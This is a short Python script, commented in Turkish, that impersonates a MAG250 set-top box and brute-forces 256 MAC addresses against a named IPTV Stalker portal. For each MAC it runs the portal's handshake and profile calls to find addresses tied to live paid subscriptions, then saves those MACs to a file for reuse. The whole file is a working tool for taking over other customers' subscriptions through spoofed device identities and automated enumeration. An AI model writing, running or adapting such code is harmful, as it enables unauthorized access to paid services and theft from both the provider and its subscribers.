import requests
import concurrent.futures

# Ana URL
portal_url = "http://dm.lion-ott.com/portal.php"

def tam_kontrol(mac):
    # Gerçek bir MAG cihazı kimliği oluşturuyoruz
    headers = {
        'User-Agent': 'MAG250',
        'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;',
        'Referer': 'http://dm.lion-ott.com/c/',
        'Connection': 'Keep-Alive'
    }
    
    try:
        # Adım 1: Handshake (Anahtar isteme)
        auth_url = f"{portal_url}?type=stb&action=handshake&token="
        res = requests.get(auth_url, headers=headers, timeout=7)
        
        if res.status_code == 200 and "token" in res.text.lower():
            # Adım 2: Profil kontrolü (Gerçekten abonelik var mı?)
            token = res.json().get('js', {}).get('token', '')
            profile_url = f"{portal_url}?type=stb&action=get_profile&token={token}"
            profile_res = requests.get(profile_url, headers=headers, timeout=7)
            
            if profile_res.status_code == 200:
                # Eğer buraya kadar geldiyse bu MAC %100 canlıdır
                print(f"✅ CANLI YAYIN: {mac}")
                return f"{mac} | DURUM: IZLENEBILIR | TOKEN ALINDI"
    except:
        pass
    return None

def baslat():
    # Senin çalışan bloğun üzerinden 256 ihtimali tara
    base = "00:1A:79:7C:6B"
    denenecekler = [f"{base}:{hex(i)[2:].zfill(2).upper()}" for i in range(256)]
    
    print(f"🚀 Derin tarama başlatıldı... Gerçek çalışanlar aranıyor.")
    
    canli_list = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
        sonuclar = list(executor.map(tam_kontrol, denenecekler))
        canli_list = [s for s in sonuclar if s]

    with open("calisan_maclar.txt", "w") as f:
        if canli_list:
            for c in canli_list:
                f.write(f"http://dm.lion-ott.com/c/ | {c}\n")
        else:
            f.write("Bu blokta izlenebilir aktif adres bulunamadı.")

if __name__ == "__main__":
    baslat()
